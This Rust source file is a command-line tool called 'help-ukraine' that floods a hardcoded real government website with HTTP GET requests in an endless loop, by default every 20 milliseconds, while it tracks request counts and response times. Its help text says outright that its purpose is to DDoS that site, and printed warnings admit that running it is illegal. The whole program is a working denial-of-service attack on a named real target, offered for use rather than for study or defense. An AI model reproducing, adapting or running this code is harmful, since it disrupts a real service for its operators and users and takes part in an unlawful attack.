// Author : SkwalExe
// Github : https://github.com/SkwalExe

extern crate reqwest;
use crossterm_cursor::TerminalCursor;
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::io::Write;
use std::process;
use std::time::SystemTime;

const RED: &str = "\x1b[91m";
const GREEN: &str = "\x1b[92m";
const YELLOW: &str = "\x1b[93m";
const BLUE: &str = "\x1b[94m";
const MAGENTA: &str = "\x1b[95m";
const WHITE: &str = "\x1b[97m";
const RESET: &str = "\x1b[0m";
const BG_RED: &str = "\x1b[41m";
const BG_MAGENTA: &str = "\x1b[45m";

// this function print a message but after 100ms
fn print_wait(text: &str) {
    std::thread::sleep(std::time::Duration::from_millis(100));
    println!("{}", text);
}

fn main() {
    // thread to detect when q is pressed -> exit
    std::thread::spawn(|| {
        let device_state = DeviceState::new();

        loop {
            let keys: Vec<Keycode> = device_state.get_keys();
            for key in keys.iter() {
                // if key is q
                if key == &Keycode::Q {
                    process::exit(0);
                }
            }
        }
    });

    let mut confirm = true; // if the program should ask for confirmation before running
    let mut delay = 20; // delay between each request
    let mut command = "ddos"; // command to run (ddos, version, help)
    let mut args: Vec<String> = std::env::args().collect(); // arguments vector
    args.remove(0); // remove the program name from the vector

    while args.len() > 0 {
        match args[0].as_str() {
            "--version" | "-v" => {
                args.remove(0);
                command = "version";
            }
            "--help" | "-h" => {
                args.remove(0);
                command = "help";
            }
            "-n" | "--no-confirm" => {
                args.remove(0);
                confirm = false;
            }
            "--delay" | "-d" => {
                if args.len() > 1 {
                    delay = match args[1].parse::<u64>() {
                        // try to parse argument as a u64
                        Ok(n) => n,
                        Err(_) => {
                            println!(
                                "{}[ x ] : Invalid argument after {} : {}{} {} {}",
                                RED, args[0], WHITE, BG_RED, args[1], RESET
                            );
                            process::exit(1);
                        }
                    };
                    args.remove(0);
                    args.remove(0);
                } else {
                    println!(
                        "{}[ x ] : Argument needed after : {}{} {} {}",
                        RED, WHITE, BG_RED, args[0], RESET
                    );
                    process::exit(1);
                }
            }
            _ => {
                println!(
                    "{}Invalid argument: {}{} {} {}",
                    RED, BG_RED, WHITE, args[0], RESET
                );
                args.remove(0);
                process::exit(1);
            }
        }
    }

    match command {
        "ddos" => {
            print!("\x1B[2J\x1B[1;1H"); // clear the screen and move the cursor to the top left
            print!("\x1b[38;5;69m"); // set color to blue
            print!("\n\n");
            print_wait("  ██░ ██ ▓█████  ██▓     ██▓███                                  ");
            print_wait("  ▓██░ ██▒▓█   ▀ ▓██▒    ▓██░  ██▒                               ");
            print_wait("  ▒██▀▀██░▒███   ▒██░    ▓██░ ██▓▒                               ");
            print_wait("  ░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██▄█▓▒ ▒                               ");
            print_wait("  ░▓█▒░██▓░▒████▒░██████▒▒██▒ ░  ░                               ");
            print_wait("   ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░▒▓▒░ ░  ░                               ");
            print_wait("   ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░▒ ░    ░                               ");
            print_wait("   ░  ░░ ░   ░     ░ ░   ░░      ░                               ");
            print!("\x1b[38;5;220m"); // set color to yellow
            print_wait("   █  ░ ██  ██ ▄█▀ ██▀███   ▄▄▄      ██▓ ███▄    █ ▓█████        ");
            print_wait("   ██  ▓██▒ ██▄█▒ ▓██ ▒ ██▒▒████▄    ▓██▒ ██ ▀█   █ ▓█   ▀       ");
            print_wait("  ▓██  ▒██░▓███▄░ ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒▓██  ▀█ ██▒▒███         ");
            print_wait("  ▓▓█  ░██░▓██ █▄ ▒██▀▀█▄  ░██▄▄▄▄██ ░██░▓██▒  ▐▌██▒▒▓█  ▄       ");
            print_wait("  ▒▒█████▓ ▒██▒ █▄░██▓ ▒██▒ ▓█   ▓██▒░██░▒██░   ▓██░░▒████▒      ");
            print_wait("  ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░      ");
            print_wait("  ░░▒░ ░ ░ ░▒ ▒░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░        ");
            print!("\n\n{}{}", RESET, RED);
            print_wait("[ WARNING ] : This program is for educational purposes only.");
            print_wait("[ WARNING ] : Executing this program IS illegal.");
            print_wait("[ WARNING ] : THE AUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED.");
            print_wait("[ WARNING ] : USE AT YOUR OWN RISK.");

            if confirm {
                // ask for confirmation
                let mut input = String::new();
                print!("\nEnter 'yes' to continue: ");
                std::io::stdout().flush().expect("Couldn't flush stdout");
                std::io::stdin().read_line(&mut input).unwrap();
                if input.trim().to_lowercase() != "yes" {
                    println!("\n{}[ i ] : Exiting...", RED);
                    process::exit(1);
                }
            }
            println!("\n{}[ i ] : Starting...\n", GREEN);
            let url = String::from("http://government.ru"); // url to send requests to

            let mut req_count = 0; // number of requests already sents

            let client = reqwest::blocking::Client::new();

            let mut cursor = TerminalCursor::new();

            let mut res_time_vec: Vec<u128> = Vec::new(); // vector of all response times to create an average
            let mut res_time: u128 = 0; // response time of the last request
            let mut average_ping: u128 = 0; // average ping

            println!("{}{}", YELLOW, url);
            let _ = cursor.hide(); // hide the cursor
            loop {
                std::thread::sleep(std::time::Duration::from_millis(delay)); // wait delay between requests
                let start = SystemTime::now(); // start time of the request
                req_count += 1;
                // Extra spaces to remove the chars left from the previous request
                println!(
                    "\r{}requests sent : {}{} {}-{} Average ping: {}ms - {}                  ",
                    BLUE,
                    req_count,
                    YELLOW,
                    WHITE,
                    MAGENTA,
                    average_ping,
                    if average_ping > 3000 {
                        format!("{} Very Slow         ", RED)
                    } else if average_ping > 1000 {
                        format!("{} Slow              ", RED)
                    } else {
                        format!("{}Normal ping        ", RED)
                    }
                );
                match client.get(&url).send() {
                    // send request
                    Ok(res) => {
                        println!(
                            "{}[ i ] : Response: {} - Ping: {}ms        ",
                            GREEN,
                            res.status(),
                            res_time
                        );
                    }
                    Err(_) => {
                        println!("{}[ x ] : Request failed               ", RED);
                    }
                }
                let _ = cursor.move_up(2); // move the cursor up 2 lines
                res_time = start.elapsed().unwrap().as_millis(); // time elapsed since the request started
                res_time_vec.push(res_time); // add the response time to the vector
                average_ping = res_time_vec.iter().sum::<u128>() / res_time_vec.len() as u128;
                // calculate the average ping
            }
        }
        "help" => {
            println!("{}{} help-ukraine {}", BG_MAGENTA, WHITE, RESET);
            println!("{}━━━━━━━━━━━━━━━━━{}", MAGENTA, RESET);
            println!("Author: {}SkwalExe{}", MAGENTA, RESET);
            println!("Github: {}https://github.com/SkwalExe{}", MAGENTA, RESET);
            println!("{}━━━━━━━━━━━━━━━━━{}", MAGENTA, RESET);
            println!(
                "{}Help ukraine in the cyberwar against russia by DDOSing russia government website{}",
                MAGENTA, RESET
            );
            println!("{}━━━━━━━━━━━━━━━━━{}", MAGENTA, RESET);

            println!(
                "\t{}--delay, -d: {}Sets the delay between each request in milliseconds [D: 20]{}",
                MAGENTA, YELLOW, RESET
            );
            println!(
                "\t{}--no-confirm, -n: {} Don't ask for confirmation before starting{}",
                MAGENTA, YELLOW, RESET
            );
            println!("{}━━━━━━━━━━━━━━━━━{}", MAGENTA, RESET);
        }
        "version" => {
            println!("{}Version: {}0.1.0{}", MAGENTA, YELLOW, RESET);
        }
        _ => {}
    }
}
